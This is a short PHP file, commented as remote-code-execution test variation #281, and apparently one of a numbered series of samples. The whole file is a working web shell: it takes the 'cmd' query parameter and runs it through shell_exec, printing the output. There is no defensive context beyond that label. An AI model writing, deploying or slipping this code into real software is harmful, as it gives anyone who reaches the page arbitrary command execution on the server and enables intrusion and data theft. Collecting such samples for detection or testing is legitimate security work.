<?php
// RCE test variation #281
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>